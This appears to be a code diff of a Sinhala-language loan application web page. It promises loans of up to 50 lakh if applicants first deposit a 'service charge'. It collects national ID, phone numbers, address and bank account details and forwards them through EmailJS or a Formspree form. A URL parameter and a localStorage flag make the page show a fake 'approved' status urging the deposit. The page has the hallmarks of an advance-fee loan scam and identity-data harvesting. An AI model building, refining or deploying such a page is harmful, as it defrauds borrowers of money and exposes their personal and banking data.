@@ -3,301 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kanishka Loan Service - පුද්ගලික ණය පහසුකම්</title>
-    <!-- EmailJS Library -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function() {
-            emailjs.init("keFPVK8UoGCkTgw88");
-        })();
-    </script>
+    <title>ණය අයදුම්පත</title>
     <style>
-        :root {
-            --primary-color: #0f5132;
-            --secondary-color: #198754;
-            --bg-color: #f4f6f9;
-            --card-bg: #ffffff;
-            --text-color: #333333;
-            --border-color: #dee2e6;
-        }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            margin: 0;
-            padding: 20px;
-            color: var(--text-color);
-            line-height: 1.6;
-        }
-        .container {
-            max-width: 550px;
-            background: var(--card-bg);
-            margin: 0 auto;
-            padding: 25px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-        }
-        h2 {
-            text-align: center;
-            color: var(--primary-color);
-            margin-bottom: 20px;
-            font-size: 22px;
-            border-bottom: 2px solid #e9ecef;
-            padding-bottom: 12px;
-        }
-        .info-box {
-            background-color: #f1f8f5;
-            border-left: 5px solid var(--secondary-color);
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        .info-box ul {
-            margin: 8px 0;
-            padding-left: 20px;
-        }
-        .warning-box {
-            background-color: #fff3cd;
-            border: 1px solid #ffeeba;
-            color: #856404;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 13px;
-            margin: 15px 0;
-            font-weight: 500;
-        }
-        .danger-box {
-            background-color: #f8d7da;
-            border: 1px solid #f5c6cb;
-            color: #721c24;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 13px;
-            margin: 15px 0;
-            font-weight: 500;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 6px;
-            font-weight: 600;
-            color: #495057;
-            font-size: 13px;
-        }
-        input, select, textarea {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            font-size: 14px;
-            box-sizing: border-box;
-        }
-        button {
-            width: 100%;
-            background-color: var(--secondary-color);
-            color: white;
-            border: none;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        button:hover {
-            background-color: #157347;
-        }
-        
-        /* Message Boxes */
-        .status-card {
-            display: none;
-            text-align: center;
-            padding: 30px 20px;
-            border-radius: 12px;
-            margin-top: 10px;
-        }
-        .pending-card {
-            background-color: #e2e3e5;
-            border: 2px solid #d6d8db;
-            color: #383d41;
-        }
-        .approved-card {
-            background-color: #d1e7dd;
-            border: 2px solid #badbcc;
-            color: #0f5132;
-        }
-        .status-icon {
-            font-size: 45px;
-            margin-bottom: 15px;
-        }
-        .status-title {
-            font-size: 20px;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .status-desc {
-            font-size: 15px;
-            line-height: 1.5;
-        }
-        .divider {
-            border: 0;
-            border-top: 1px solid var(--border-color);
-            margin: 15px 0;
-        }
+        body { font-family: Arial, sans-serif; background: #f4f4f9; padding: 20px; text-align: center; }
+        .card { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
+        input, button { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { background: #28a745; color: white; font-size: 16px; border: none; cursor: pointer; }
+        .hidden { display: none; }
+        .success-box { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>💰 පුද්ගලික ණය පහසුකම්</h2>
-
-    <!-- 1. FORM CONTAINER -->
-    <div id="formContainer">
-        <div class="info-box">
-            <p style="margin-top: 0; font-weight: 600;">ඔයාට ලක්ෂ 1 සිට ලක්ෂ 50 දක්වා ණය පහසුකම් ලබාගන්න පුළුවන්.</p>
-            
-            <strong>📌 අවශ්‍ය දේවල්:</strong>
-            <ul>
-                <li>🪪 ජාතික හැඳුනුම්පත (ID Card) හෝ පාස්පෝට් එකේ ෆොටෝ 2ක්</li>
-                <li>🏠 ස්ථීර ලිපිනය</li>
-            </ul>
-
-            <p style="margin-bottom: 5px;">🔹 අපි මේ සියලු කටයුතු Online හරහාම කරනවා<br>
-            🔹 පැහැදිලි හා විශ්වාසදායක සේවාවක් ලබාදෙයි</p>
-
-            <hr class="divider">
-
-            <strong>💳 Service Charge විස්තර:</strong>
-            <p style="margin: 10px 0 5px 0;">
-               • ලක්ෂයට 5500<br>
-               • ලක්ෂ 2 ට 11000<br>
-               • ලක්ෂ 5 ට 27500<br>
-               • ලක්ෂ 10ට 55000<br>
-               • ලක්ෂ 20ට 110000<br>
-               • ලක්ෂ 30ට 175000<br>
-               • ලක්ෂ 50ට 275000
-            </p>
-
-            <div class="warning-box">
-                ⚠️ සර්විස් චාර්ජ් එක අනිවාරෙන් ලෝන් එක ගන්න කලින් ඩිපොසිට් කරන්න ඕනේ. ඔයාට අවශ්‍ය මුදලට service charge එක ඩිපොසිට් කරලා පැය දෙකෙන් ඔයාට ලෝන් එක ගන්න පුළුවන්.
-            </div>
-
-            <strong>⏳ ගෙවීම් කොන්දේසි:</strong>
-            <ul>
-                <li>⏱️ අවුරුදු 4ක් ඇතුළත මුදල සම්පූර්ණයෙන්ම ගෙවිය යුතුයි</li>
-                <li>❌ මාසික වාරික අනිවාර්ය නැහැ</li>
-                <li>✅ ඔබට හැකි විදියට අවුරුදු 4 ඇතුළත ගෙවන්න පුළුවන්</li>
-            </ul>
-
-            <div class="danger-box">
-                ⚠️ අවුරුදු 4 ඇතුළත ගෙවන්න බැරි වුණොත්, ලබාගත් මුදලට සීයට 10ක අමතර මුදලක් ගෙවිය යුතුයි.
-            </div>
-        </div>
-
-        <form id="loanForm">
-            <div class="form-group">
-                <label>සම්පූර්ණ නම:</label>
-                <input type="text" id="fullName" name="fullName" placeholder="ඔබගේ නම ඇතුළත් කරන්න" required>
-            </div>
-
-            <div class="form-group">
-                <label>ජාතික හැඳුනුම්පත් අංකය (NIC) / පාස්පෝට් අංකය:</label>
-                <input type="text" id="nic" name="nic" placeholder="NIC හෝ Passport අංකය" required>
-            </div>
-
-            <div class="form-group">
-                <label>දුරකථන අංක දෙකක් (Phone Numbers):</label>
-                <input type="text" id="phone" name="phone" placeholder="දුරකථන අංක දෙකක් ඇතුළත් කරන්න" required>
-            </div>
-
-            <div class="form-group">
-                <label>ස්ථීර පදිංචි ලිපිනය:</label>
-                <textarea id="address" name="address" rows="2" placeholder="ඔබේ ලිපිනය" required></textarea>
-            </div>
-
-            <div class="form-group">
-                <label>අවශ්‍ය ණය මුදල (රු.):</label>
-                <input type="number" id="amount" name="amount" placeholder="අවශ්‍ය මුදල සඳහන් කරන්න" required>
-            </div>
-
-            <div class="form-group">
-                <label>අවශ්‍ය බැංකු විස්තර (බැංකුව, ශාඛාව, ගිණුම් අංකය):</label>
-                <textarea id="bank" name="bank" rows="2" placeholder="බැංකුව, ශාඛාව සහ ගිණුම් අංකය" required></textarea>
-            </div>
-
-            <button type="submit" id="submitBtn">අයදුම්පත යොමු කරන්න</button>
+    <div class="card" id="formCard">
+        <h2>ණය අයදුම්පත</h2>
+        <form id="loanForm" action="https://formspree.io/f/YOUR_FORM_ID" method="POST" onsubmit="saveLoanData(event)">
+            <input type="text" name="nic" id="nic" placeholder="ජාතික හැඳුනුම්පත් අංකය (NIC)" required>
+            <input type="text" name="phone" id="phone" placeholder="දුරකථන අංකය" required>
+            <input type="text" name="address" id="address" placeholder="ලිපිනය" required>
+            <input type="number" name="amount" id="amount" placeholder="අවශ්‍ය ණය මුදල" required>
+            <input type="text" name="bank" id="bank" placeholder="බැංකු විස්තර" required>
+            <button type="submit">අයදුම් කරන්න</button>
         </form>
     </div>
 
-    <!-- 2. PENDING STATUS CONTAINER -->
-    <div id="pendingCard" class="status-card pending-card">
-        <div class="status-icon">⏳</div>
-        <div class="status-title">අයදුම්පත ලැබුණි!</div>
-        <div class="status-desc">
-            ස්තුතියි! ඔබගේ ණය අයදුම්පත සාර්ථකව යොමු කරන ලදී. <br><br>
-            <strong>ඔබගේ ණය මුදල සම්බන්ධයෙන් අප ඉක්මනින් ඔබට දැනුම් දෙන්නෙමු.</strong>
-        </div>
-    </div>
-
-    <!-- 3. APPROVED STATUS CONTAINER -->
-    <div id="approvedCard" class="status-card approved-card">
-        <div class="status-icon">🎉</div>
-        <div class="status-title">ණය මුදල අනුමත වී ඇත!</div>
-        <div class="status-desc">
-            සුබ පැතුම්! ඔබගේ ණය අයදුම්පත සාර්ථකව අනුමත කර ඇත.<br><br>
-            <strong>අවශ්‍ය මුදලට Deposit එක දමා ඉක්මනින් ණය මුදල ලබාගන්න.</strong>
-        </div>
-    </div>
-
-</div>
-
-<script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const statusParam = urlParams.get('status');
-
-    if (statusParam === 'approved') {
-        localStorage.setItem('loan_user_status', 'approved');
-    }
-
-    const currentStatus = localStorage.getItem('loan_user_status');
-
-    const formContainer = document.getElementById('formContainer');
-    const pendingCard = document.getElementById('pendingCard');
-    const approvedCard = document.getElementById('approvedCard');
-
-    if (currentStatus === 'approved' || statusParam === 'approved') {
-        formContainer.style.display = 'none';
-        pendingCard.style.display = 'none';
-        approvedCard.style.display = 'block';
-    } else if (currentStatus === 'pending') {
-        formContainer.style.display = 'none';
-        approvedCard.style.display = 'none';
-        pendingCard.style.display = 'block';
-    }
-
-    const form = document.getElementById('loanForm');
-    const submitBtn = document.getElementById('submitBtn');
-
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
+    <div class="card hidden" id="statusCard">
+        <h2 id="statusTitle">⏳ අයදුම්පත ලැබුණි</h2>
+        <p id="statusText">ඔබගේ ණය අයදුම්පත පරීක්ෂා කරමින් පවතී. කරුණාකර රැඳී සිටින්න...</p>
         
-        submitBtn.innerText = "යොමු කරමින් පවතී...";
-        submitBtn.disabled = true;
+        <div class="hidden success-box" id="approvedDetails">
+            <h3>✅ ණය අනුමත විය!</h3>
+            <p><strong>ගිණුම් අංකය:</strong> <span id="accNumber"></span></p>
+            <p><strong>බැංකුව:</strong> <span id="bankName"></span></p>
+            <p><strong>අනුමත කළ මුදල:</strong> රු. <span id="approvedAmount"></span>/=</p>
+        </div>
+    </div>
 
-        emailjs.sendForm('service_vl0i3v9', 'template_tf3mmoe', this)
-            .then(function() {
-                localStorage.setItem('loan_user_status', 'pending');
-                formContainer.style.display = 'none';
-                pendingCard.style.display = 'block';
-            }, function(error) {
-                alert('යම් දෝෂයක් සිදු විය. කරුණාකර නැවත උත්සාහ කරන්න.');
-                submitBtn.innerText = "අයදුම්පත යොමු කරන්න";
-                submitBtn.disabled = false;
-            });
-    });
-</script>
+    <script>
+        function saveLoanData(e) {
+            // මෙතනදී කස්ටමර් දාපු හැම විස්තරයක්ම සේව් කරගන්නවා
+            const loanData = {
+                nic: document.getElementById('nic').value,
+                phone: document.getElementById('phone').value,
+                address: document.getElementById('address').value,
+                amount: document.getElementById('amount').value,
+                bank: document.getElementById('bank').value,
+                status: 'pending'
+            };
+            localStorage.setItem('customerLoan', JSON.stringify(loanData));
+        }
 
+        function checkStatus() {
+            const data = JSON.parse(localStorage.getItem('customerLoan'));
+            if (data) {
+                document.getElementById('formCard').classList.add('hidden');
+                document.getElementById('statusCard').classList.remove('hidden');
+
+                if (data.status === 'approved') {
+                    document.getElementById('statusTitle').innerText = "සාර්ථකයි!";
+                    document.getElementById('statusText').innerText = "ඔබගේ ණය අයදුම්පත අනුමත කර ඇත.";
+                    document.getElementById('approvedDetails').classList.remove('hidden');
+                    document.getElementById('accNumber').innerText = "8123456789";
+                    document.getElementById('bankName').innerText = data.bank;
+                    document.getElementById('approvedAmount').innerText = data.amount;
+                }
+            }
+        }
+
+        setInterval(checkStatus, 3000);
+        window.onload = checkStatus;
+    </script>
 </body>
 </html>
